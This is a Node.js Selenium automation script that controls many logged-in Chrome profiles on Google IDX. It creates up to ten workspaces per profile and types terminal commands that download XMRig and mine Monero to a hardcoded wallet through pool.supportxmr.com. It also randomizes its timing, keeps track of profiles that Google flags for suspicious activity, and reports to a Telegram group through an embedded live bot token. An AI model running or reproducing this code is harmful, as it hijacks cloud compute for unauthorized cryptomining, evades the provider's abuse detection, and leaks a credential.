

const { Builder, By, Key, until } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const path = require('path');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');

// Define your bot token and chat ID
const TELEGRAM_BOT_TOKEN = '7668129713:AAGGfomtEre-W2QH0r1FUPL1Z9pKSd0KMlQ';
// const TELEGRAM_CHAT_ID = '1140704410';
const TELEGRAM_CHAT_ID = '-4750007696'; // group chat id

const wait = (min, maxPlus) => new Promise(resolve => setTimeout(resolve, (min * 10 + maxPlus * 10 * Math.random()) * 1000))
const openChrome = async (port, profilePath) => {
  let remoteDebugCmd = ''
  if (process.platform === 'win32') {
    const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
    remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir="${profilePath}" --disable-session-crashed-bubble --no-first-run --no-default-browser-check --restore-last-session --disable-infobars --disable-popup-blocking`;
  } else {
    const chromePath = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
    remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir="${profilePath}" --disable-session-crashed-bubble --no-first-run --no-default-browser-check --restore-last-session --disable-infobars --disable-popup-blocking`;
  }
  return new Promise((resolve, reject) => {
    console.log('Executing:', remoteDebugCmd);
    exec(remoteDebugCmd, (error) => {
      if (error) {
        console.error(`Error launching Chrome: ${error.message}`);
        reject(error);
      } else {
        console.log('Chrome launched with remote debugging');
        resolve();
      }
      console.log('Chrome launched with remote debugging');
    });
  });
}

async function sendTelegramMessage(botToken, chatId, message) {
  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      }
    );

    if (response.data && response.data.ok) {
      console.log('Message sent to Telegram successfully');
      return true;
    } else {
      console.error('Failed to send Telegram message:', response.data);
      return false;
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error.message);
    return false;
  }
}

const getMainTargetLinks = async (driver) => {

  await driver.get('https://idx.google.com');
  console.log('Navigated to https://idx.google.com');

  await wait(2, 2);
  const mainTargetLinks = [];
  // Wait for the page to load and main-target elements to be present
  await driver.wait(until.elementsLocated(By.css('.main-target')), 20 * 1000)
    .catch(() => {
      console.log('No .main-target elements found within timeout period');
      return mainTargetLinks;
    });
  await driver.wait(until.elementsLocated(By.css('.subtitle')), 20 * 1000)
    .catch(() => {
      console.log('No .subtitle elements found within timeout period');
      return mainTargetLinks;
    });
  // Get list of links with class "main-target"
  const mainTargetElements = await driver.findElements(By.css('.subtitle'));

  // Extract href attributes from found elements
  for (const element of mainTargetElements) {
    try {
      const spanElements = await element.findElements(By.css('span'));
      let thirdSpanText = '';
      let firstSpanText = '';
      if (spanElements.length > 2) {
        thirdSpanText = await spanElements[2].getText();
      }
      if (spanElements[0]) {
        firstSpanText = await spanElements[0].getText();
      }
      mainTargetLinks.push({ href: 'https://idx.google.com/' + firstSpanText, isArchived: thirdSpanText === 'Archived' });
    } catch (error) {
      console.error('Error getting href attribute:', error.message);
    }
  }
  return mainTargetLinks;
}
const connectChrome = async (port) => {

  let options = new chrome.Options();
  options.addArguments(
    '--disable-popup-blocking',
    '--disable-infobars',
    '--disable-session-crashed-bubble',  // 💡 THIS disables the "Restore pages" bubble
    '--no-first-run'
  );
  options.options_['debuggerAddress'] = 'localhost:' + port;

  let driver = await new Builder()
    .forBrowser('chrome')
    .setChromeOptions(options)
    .build();

  return driver;

}
const createNewProfileIfCan = async (driver, mainTargetLinks, name) => {
  if (mainTargetLinks.length < 10) {//dnd_test
    for (let i = mainTargetLinks.length; i < 10; i++) {
      try {
        // Navigate to the new project page
        await wait(2, 2);
        await driver.get('https://idx.google.com/new/react-native');
        await wait(2, 2);

        // Wait for and fill the input field
        await driver.wait(until.elementLocated(By.css('#mat-input-0')), 30000);
        await wait(2, 2);
        await driver.findElement(By.css('#mat-input-0')).sendKeys(`${name}-w${i}-`);
        await wait(5, 3);
        await driver.findElement(By.css('#mat-input-0')).sendKeys('\uE007'); // Enter key

        await wait(2, 2);
        // Wait for iframe to load
        await driver.wait(until.elementLocated(By.css('iframe.is-loaded')), 60 * 1000);

        await wait(2, 2);
        // No need to close this page, we'll navigate away
        console.log(`Created new project ${name}-w${i}-`);
      } catch (error) {
        console.log('Error creating new page with Selenium');
        break;
      }
    }
  }

}

const closeOtherTabs = async (driver) => {
  const currentHandle = await driver.getWindowHandle();
  const allHandles = await driver.getAllWindowHandles();
  for (const handle of allHandles) {
    if (handle !== currentHandle) {
      await driver.switchTo().window(handle);
      await driver.close();
    }
  }

  await driver.switchTo().window(currentHandle);
}
const checkGG = async (driver, name, port) => {
  try {
    const listErrors = await readErrProfiles(path.join(__dirname, 'error_profile.txt'))
    if (listErrors.includes(`${name}_${port}`)) {
      console.log('Already checked this profile:', `${name}_${port}`);
      return 'suspicious';
    }
    let err = '';
    await driver.wait(until.elementLocated(By.css('.error-section.callout.severity-error.is-loud')), 10000);
    const errorElement = await driver.findElement(By.css('.error-section.callout.severity-error.is-loud p'));
    const errorMessage = await errorElement.getText();

    if (errorMessage) {
      console.log('Error message:', errorMessage);
      if (errorMessage.includes('detected suspicious activity')) {
        await saveErrProfile(path.join(__dirname, 'error_profile.txt'), `${name}_${port}`);
        err = 'suspicious';
      }
      await sendTelegramMessage(
        TELEGRAM_BOT_TOKEN,
        TELEGRAM_CHAT_ID,
        `Máy #_${name}_# profile ${port} #tails${port} ⚠️ Error detected with Selenium::: ${errorMessage}`
      );
      return err;
    }
  } catch (error) {
    console.error('Error in checkDie with Selenium:', error);
    return 'error';
  }
}

/**
 * Runs commands in a terminal using Selenium WebDriver
 * @param {WebDriver} driver - Selenium WebDriver instance
 * @param {string} name - The name to use in the command
 */
const runCMDWithSelenium = async (driver, name) => {
  try {
    console.log('Running command with Selenium...');
    console.log('Pressed============3');
    await wait(1, 2);
    console.log('Pressed============2');
    await wait(1, 2);
    console.log('Pressed============1');
    await wait(1, 2);
    console.log('open terminal');
    await driver.actions()
      .keyDown(Key.CONTROL)
      .sendKeys('`')
      .keyUp(Key.CONTROL)
      .perform();
    await driver.wait(until.elementLocated(By.css('.xterm-helper-textarea')), 2 * 60 * 1000)
      .catch(async () => {
        await driver.actions()
          .keyDown(Key.CONTROL)
          .sendKeys('`')
          .keyUp(Key.CONTROL)
          .perform();
      })
    await driver.wait(until.elementLocated(By.css('.xterm-helper-textarea')), 2 * 60 * 1000)
    // Try to find the helper textarea
    const textarea = await driver.findElement(By.css('.xterm-helper-textarea'));
    await driver.executeScript("arguments[0].focus()", textarea);
    console.log('control c');
    await driver.actions()
      .keyDown(Key.CONTROL)
      .sendKeys('c')
      .keyUp(Key.CONTROL)
      .perform();
    ;

    await new Promise(resolve => setTimeout(resolve, 100));
    const commands = [
      "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2",
      " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
      " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
      " && ./xmrig-6.22.2/xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    ];
    for (const cmd of commands) {
      await wait(0.1, 0.1);
      await driver.executeScript("arguments[0].focus()", textarea);
      await driver.actions().sendKeys(cmd).perform();
    }
    await driver.actions().sendKeys('\uE007').perform(); // Enter key
    // console.log('Commands executed with Selenium');
    // const cmd = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
    // await driver.actions().sendKeys(cmd).perform();
    // await driver.actions().sendKeys('\uE007').perform(); // Enter key
  } catch (error) {
    console.error('Error in run cmd:', error);
  }
}
const restartAllWorker = async ({ driver, listNewLink: links, port, name }) => {
  console.log('Restarting all workers with Selenium...');
  let count = 0;
  for (const link of links) {
    const profileStartTime = new Date();
    console.log(++count, 'link:', link);
    if (!link.isArchived) {
      console.log('Link is not archived, skipping:', link.href);
      continue;
    }
    // Get the worker name from the URL
    const location = link.href.split('/');
    const workerName = location[location.length - 1];
    console.log('open links:', link);
    await wait(4, 3);
    await driver.get(link.href);
    await wait(2, 3);
    console.log('Resetting link with Selenium:');
    // Wait for iframe to load
    await driver.wait(until.elementLocated(By.css('iframe.is-loaded')), 10 * 60 * 1000);
    const iframe = await driver.findElement(By.css('iframe.is-loaded'));
    const src = await iframe.getAttribute('src');
    await wait(3, 3);
    const originalTab = await openNewTab(driver, src);
    await wait(3, 3);
    await driver.wait(until.elementLocated(By.css('.menubar-menu-button')), 10 * 60 * 1000);
    await driver.wait(until.elementLocated(By.css('.monaco-highlighted-label')), 10 * 60 * 1000);
    await wait(4, 4);
    const worker = workerName.includes(name) ? workerName : `${name}-${workerName}`;
    await runCMDWithSelenium(driver, worker.slice(0, 16));
    console.log('done cmd index:', count);
    await wait(5, 4);
    const profileEndTime = new Date();
    const profileDuration = (profileEndTime - profileStartTime) / 60 * 1000;
    console.log(`done_worker: ${count} completed in ${(profileDuration).toFixed(2)} minutes`);

    await driver.close();
    await driver.switchTo().window(originalTab); // Switch back when done
    console.log(`${workerName} done with Selenium index:`, count);
    await wait(1, 2);

  }
};
/**
 * Opens a new browser tab and switches to it
 * @param {WebDriver} driver - Selenium WebDriver instance
 * @param {string} url - Optional URL to navigate to in the new tab
 * @returns {Promise<string>} - The handle of the original tab for switching back
 */
const openNewTab = async (driver, url = null) => {
  try {
    // Store the current window handle to return to later if needed
    const originalHandle = await driver.getWindowHandle();

    // Method 1: Using JavaScript executor
    await driver.executeScript('window.open()');

    // Get all window handles and switch to the new one
    const handles = await driver.getAllWindowHandles();
    const newTabHandle = handles[handles.length - 1]; // The newest handle
    await driver.switchTo().window(newTabHandle);

    // Navigate to URL if provided
    if (url) {
      await driver.get(url);
      console.log(`Opened new tab and navigated to ${url}`);
    } else {
      console.log('Opened new tab');
    }

    return originalHandle; // Return the original handle
  } catch (error) {
    console.error('Error opening new tab:', error);
    throw error;
  }
};

const runProfiles = async (port, name) => {
  const driver = await connectChrome(port);
  try {
    const listLink = await getMainTargetLinks(driver);
    await wait(5, 2);
    if (listLink.length > 0) {
      driver.get(listLink[0].href);
      await wait(2, 2);
      const err = await checkGG(driver, name, port);
      if (err === 'suspicious') {
        await driver.close();
        await driver.quit();
        throw new Error('Suspicious activity detected');
      }
    }
    await createNewProfileIfCan(driver, listLink, name);
    // await closeOtherTabs(driver);
    const listNewLink = await getMainTargetLinks(driver);
    listNewLink.reverse();
    if (!listNewLink || listNewLink.length === 0) return;
    await wait(5, 2);
    await restartAllWorker({ driver, listNewLink, port, name });


    await driver.close();
    await driver.quit();
  } catch (error) {
    console.error('Error in _runProfiles:', error);
    await driver.close();
    await driver.quit();
    return;
  }
}


const killChromeProcess = (name) => {
  return new Promise((res, rej) => {
    if (process.platform === 'win32') {
      return exec('taskkill /IM chrome.exe /F', () => res());
    } else {
      return exec('killall "Google Chrome"', () => res());
    }
  })
};

function readDirectory(directoryPath) {
  console.log(`Reading files in: ${directoryPath}\n`);
  try {
    // Get all files and directories in the current directory
    const items = fs.readdirSync(directoryPath);

    items.forEach(item => {
      const itemPath = path.join(directoryPath, item);
      const stats = fs.statSync(itemPath);

      if (stats.isDirectory()) {
        console.log(`📁 Directory: ${item}`);
      } else {
        console.log(`📄 File: ${item} (${(stats.size / 1024).toFixed(2)} KB)`);
      }
    });

    return items;
  } catch (error) {
    console.error(`Error reading directory: ${error.message}`);
    return [];
  }
}



const saveErrProfile = async (filePath, profilePathName) => {
  try {
    // Append the profile path name to the error file
    fs.appendFileSync(filePath, profilePathName + '\n', { encoding: 'utf8' });
    console.log(`Successfully saved error profile: ${profilePathName} to ${filePath}`);
    return true;
  } catch (error) {
    console.error(`Error saving profile path to error file: ${error.message}`);
    return false;
  }
};
const readErrProfiles = (filePath) => {
  try {
    // Check if the error file exists
    if (!fs.existsSync(filePath)) {
      console.log(`Error file ${filePath} does not exist yet. Returning empty array.`);
      return [];
    }

    // Read the file content and split by newlines to get individual profiles
    const fileContent = fs.readFileSync(filePath, { encoding: 'utf8' });
    const profiles = fileContent
      .split('\n')
      .filter(line => line.trim() !== ''); // Remove empty lines

    console.log(`Successfully read ${profiles.length} error profiles from ${filePath}`);
    return profiles;
  } catch (error) {
    console.error(`Error reading error profiles from file: ${error.message}`);
    return [];
  }
};

const main = async () => {
  const machineName = process.argv[2] || `dnd`;
  const profilePath = path.join(__dirname, 'profile');
  const fileList = readDirectory(profilePath);
  // fileList.reverse();
  for (const element of fileList) {
    try {
      const profileStartTime = new Date();
      const port = element.slice(-4);
      console.log('port:', port);

      const workerPrefix = `${machineName}-p${port}`;
      const profilePath = path.join(__dirname, 'profile', `chrome-profile${port}`);
      openChrome(port, profilePath);
      await wait(1, 5);
      await runProfiles(port, workerPrefix);
      await wait(5, 5);
      const profileEndTime = new Date();
      const profileDuration = (profileEndTime - profileStartTime) / 60 * 1000;
      console.log(`done_profile: chrome-profile${port} completed in ${(profileDuration).toFixed(2)} minutes`);
    } catch (error) {
      console.error('Error in runTerminal:', error);
    }
  }
}
main();